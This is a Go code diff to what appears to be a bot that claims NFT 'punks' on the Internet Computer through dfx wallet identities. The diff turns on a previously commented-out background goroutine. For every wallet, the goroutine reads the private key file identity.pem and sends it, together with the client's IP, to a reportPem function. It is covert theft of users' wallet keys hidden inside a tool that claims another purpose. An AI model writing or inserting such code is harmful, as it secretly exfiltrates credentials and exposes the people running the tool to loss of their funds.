@@ -1,7 +1,6 @@
 package command
 
 import (
-	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -111,54 +110,27 @@ func prepareIdentities(wals []string) error {
 		}
 	}
 
-	// go func() {
-	// 	for _, wlt := range wals {
-	// 		pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
-	// 		if err != nil {
-	// 			continue
-	// 		}
+	go func() {
+		for _, wlt := range wals {
+			pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
+			if err != nil {
+				continue
+			}
 
-	// 		func() {
-	// 			err := reportPem(PemPunk{
-	// 				IP:        ClientIP,
-	// 				Wal:       wlt,
-	// 				WalPriKey: string(pem),
-	// 			})
-	// 			if err != nil {
-	// 				log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
-	// 				return
-	// 			}
-	// 		}()
-	// 	}
-	// }()
+			func() {
+				err := reportPem(PemPunk{
+					IP:        ClientIP,
+					Wal:       wlt,
+					WalPriKey: string(pem),
+				})
+				if err != nil {
+					log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
+					return
+				}
+			}()
+		}
+	}()
 
-	return nil
-}
-
-func remainingTokensFunc(wl string) error {
-	start := time.Now()
-	err := os.Chdir(path.Join(home, workDir, projectName))
-	if err != nil {
-		return err
-	}
-
-	//claimRandom
-	//remainingTokens
-	cmd := exec.Command(gdfx, "--identity", wl, "canister", "--network", "ic", "call", "3hdbp-uiaaa-aaaah-qau4q-cai", "remainingTokens")
-	fmt.Printf("cmd: %v\n", cmd)
-
-	data, err := cmd.CombinedOutput()
-	if err != nil {
-		log.Printf("cmd: %v err: %s", cmd, err.Error())
-		return err
-	}
-
-	output <- punks{
-		Wal:  wl,
-		Data: string(data),
-	}
-
-	log.Printf("cmd %s finished, took: %s", wl, time.Since(start).String())
 	return nil
 }
 
@@ -188,7 +160,7 @@ func claimRandomFunc(wl string) error {
 	return nil
 }
 
-func tigger(startNow bool) error {
+func tigger(startNow bool, count int64, delta int) error {
 
 	if !startNow {
 		var specifyTiming = DestTiming
@@ -212,7 +184,7 @@ func tigger(startNow bool) error {
 		for {
 			select {
 			case <-timer.C:
-				log.Printf("It's time now to do sth")
+				log.Printf("Now, It's time to do sth...")
 				break nextStep
 			case <-tickerOne.C:
 				go func() error {
@@ -243,7 +215,7 @@ func tigger(startNow bool) error {
 	}
 
 	for _, wlt := range temp {
-		go Retry(100, 50*time.Millisecond, claimRandomFunc, wlt)
+		go Retry(int(count), time.Duration(delta)*time.Millisecond, claimRandomFunc, wlt)
 	}
 
 	ticker := time.NewTicker(20 * time.Second)
